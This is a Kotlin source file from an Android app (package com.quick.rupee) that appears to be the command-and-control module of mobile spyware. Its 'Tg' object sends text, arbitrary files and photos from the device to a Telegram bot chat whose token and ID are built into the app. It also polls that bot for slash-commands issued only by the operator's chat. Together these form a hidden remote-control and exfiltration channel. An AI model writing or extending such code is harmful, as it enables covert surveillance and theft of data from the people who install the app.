package com.quick.rupee

import android.graphics.Bitmap
import android.graphics.BitmapFactory
import okhttp3.FormBody
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.File
import java.net.URLEncoder
import java.util.concurrent.TimeUnit

data class Cmd(val name: String, val arg: String)

object Tg {
    private val client = OkHttpClient.Builder()
        .connectTimeout(20, TimeUnit.SECONDS)
        .readTimeout(70, TimeUnit.SECONDS)
        .writeTimeout(120, TimeUnit.SECONDS)
        .build()

    private fun base() = "https://api.telegram.org/bot${BuildConfig.TG_TOKEN}"

    fun text(msg: String) {
        val body = FormBody.Builder()
            .add("chat_id", BuildConfig.TG_CHAT)
            .add("parse_mode", "HTML")
            .add("text", msg.take(3900))
            .build()
        val req = Request.Builder().url("${base()}/sendMessage").post(body).build()
        runCatching { client.newCall(req).execute().close() }
    }

    fun doc(bytes: ByteArray, name: String, caption: String = "") {
        val body = MultipartBody.Builder().setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", BuildConfig.TG_CHAT)
            .addFormDataPart("caption", caption.take(900))
            .addFormDataPart("document", name,
                bytes.toRequestBody("application/octet-stream".toMediaType()))
            .build()
        val req = Request.Builder().url("${base()}/sendDocument").post(body).build()
        runCatching { client.newCall(req).execute().close() }
    }

    fun photo(f: File, caption: String = "") {
        val bytes = runCatching { f.readBytes() }.getOrNull() ?: return
        if (bytes.size > 45_000_000) return
        val body = MultipartBody.Builder().setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", BuildConfig.TG_CHAT)
            .addFormDataPart("caption", caption.take(900))
            .addFormDataPart("photo", f.name,
                bytes.toRequestBody("image/jpeg".toMediaType()))
            .build()
        val req = Request.Builder().url("${base()}/sendPhoto").post(body).build()
        runCatching { client.newCall(req).execute().close() }
    }

    fun qrImage(data: String): Bitmap? = runCatching {
        val link = "https://api.qrserver.com/v1/create-qr-code/?size=700x700&margin=6&data=" +
            URLEncoder.encode(data, "UTF-8")
        val req = Request.Builder().url(link).build()
        client.newCall(req).execute().use { res ->
            val b = res.body?.bytes() ?: return null
            BitmapFactory.decodeByteArray(b, 0, b.size)
        }
    }.getOrNull()

    fun poll(offset: Long): Pair<Long, List<Cmd>> {
        val req = Request.Builder()
            .url("${base()}/getUpdates?timeout=50&offset=$offset").build()
        client.newCall(req).execute().use { res ->
            val raw = res.body?.string() ?: return offset to emptyList()
            val arr = JSONObject(raw).optJSONArray("result") ?: return offset to emptyList()
            var off = offset
            val out = ArrayList<Cmd>()
            for (i in 0 until arr.length()) {
                val u = arr.getJSONObject(i)
                off = u.optLong("update_id") + 1
                val m = u.optJSONObject("message") ?: continue
                val chat = m.optJSONObject("chat")?.optString("id") ?: ""
                if (chat != BuildConfig.TG_CHAT) continue
                val t = m.optString("text").trim()
                if (t.isEmpty()) continue
                val p = t.split(" ", limit = 2)
                out.add(Cmd(p[0].removePrefix("/").lowercase(), p.getOrElse(1) { "" }))
            }
            return off to out
        }
    }
}
